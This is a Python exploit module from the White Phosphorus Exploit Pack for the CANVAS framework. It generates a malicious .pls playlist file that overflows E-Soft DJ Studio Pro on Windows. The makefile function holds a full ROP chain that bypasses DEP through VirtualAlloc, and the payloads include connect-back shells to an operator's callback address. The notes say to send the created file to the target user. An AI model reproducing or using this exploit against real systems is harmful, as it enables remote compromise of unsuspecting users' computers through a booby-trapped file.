
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside


######################################################################################
NAME = "DJ Studio Pro .pls File Format Overflow"
DESCRIPTION = "A file format overflow in DJ Studio Pro"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='E-Soft'
DOCUMENTATION["Date public"] = "2010-09-17"
DOCUMENTATION["References"] = "http://osvdb.org/show/osvdb/68178"
DOCUMENTATION["Repeatability"] = "Unlimited"                              
DOCUMENTATION['CVE'] = "N/A"
DOCUMENTATION['CVE Url'] = 'N/A'
DOCUMENTATION["Notes"] = """
This is a client-side exploit - run the module and send the created file to the target user.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "7", "Vista"]

NOTES="""
This is a client-side exploit - so run the module and send the created file
to the target user

---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> DJ Studio Pro .pls File Format Overflow
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal DEP

Payloads:
0: IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_djstudiopro_pls/wp_djstudiopro_pls.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal DEP", (0x00000000), [WINALL]]
}


class theexploit(wp_exploit, httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]

    DEFAULT_PAYLOAD = 1

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.isClientD = False
        self.use_universal = True
        self.badstring = "\x00\x0a\x0d\x20\x5c"
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".pls"
        self.encode_printable = True
        return

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def neededListenerTypes(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    
    
    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        # If called from clientD there will be no target here
        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
                   
        return   

    def makefile(self):
        filedata = "[playlist]\r\nFile1="
        filedata += wp_randomnops(264)
        filedata += pack('<L', 0x10002D87) # add esp,103c
        filedata += wp_randomnops(636)
        filedata += pack('<L', 0x1001D27E)*20 # ret
        filedata += pack('<L', 0x275d6539) # pop eax
        filedata += pack('<L', 0x10039E97) # xchg ebp,eax
        filedata += pack('<L', 0x1004379D) # lea ebp,[esp+c]
        filedata += pack('<L', 0x2758ea58) # add eax,c
        filedata += pack('<L', 0x2758ea58) # add eax,c
        filedata += pack('<L', 0x2758ea58) # add eax,c
        filedata += pack('<L', 0x2758ea58) # add eax,c
        filedata += pack('<L', 0x2758ea58) # add eax,c
        filedata += pack('<L', 0x2758ea58) # add eax,c
        filedata += pack('<L', 0x2758ea58) # add eax,c
        filedata += pack('<L', 0x2758ea58) # add eax,c
        filedata += pack('<L', 0x2758ea58) # add eax,c
        filedata += pack('<L', 0x2759ea46) # xchg eax,edi
        filedata += pack('<L', 0x275d6539) # pop eax
        filedata += pack('<L', 0x10039E97) # xchg ebp,eax
        filedata += pack('<L', 0x1004379D) # lea ebp,[esp+c]
        filedata += pack('<L', 0x004E5191) # stosd
        filedata += pack('<L', 0x2758b2d7) # xor eax,eax
        filedata += pack('<L', 0x275d6539) # pop eax
        filedata += pack('<L', 0xFFFFF000) # 
        filedata += pack('<L', 0x10039094) # neg eax
        filedata += pack('<L', 0x004E5191) # stosd
        filedata += pack('<L', 0x004E5191) # stosd
        filedata += pack('<L', 0x275d6539) # pop eax
        filedata += pack('<L', 0xFFFFFFC0) # 
        filedata += pack('<L', 0x10039094) # neg eax
        filedata += pack('<L', 0x004E5191) # stosd
        filedata += pack('<L', 0x275d6539) # pop eax
        filedata += pack('<L', 0x275D6539) # pop eax
        filedata += pack('<L', 0x1004379D) # lea ebp,[esp+c]
        filedata += pack('<L', 0x275811C8) # VirtualAlloc
        filedata += pack('<L', 0x275E0B6C) # mov eax,[eax]
        filedata += pack('<L', 0x27626cdb) # call eax / ret 4
        filedata += pack('<L', 0x61616161)
        filedata += pack('<L', 0x61616161)
        filedata += pack('<L', 0x61616161)
        filedata += pack('<L', 0x61616161)
        filedata += pack('<L', 0x1000BFCA) # push esp / ret
        filedata += pack('<L', 0x61616161)
        filedata += self.shellcode
        filedata += wp_randomnops((10000 - len(filedata)))
        return filedata

    def run(self):
        filedata=self.makefile()
        self.log("WP> Opening %s for output"%(self.filename))
        
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(self.filename))
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
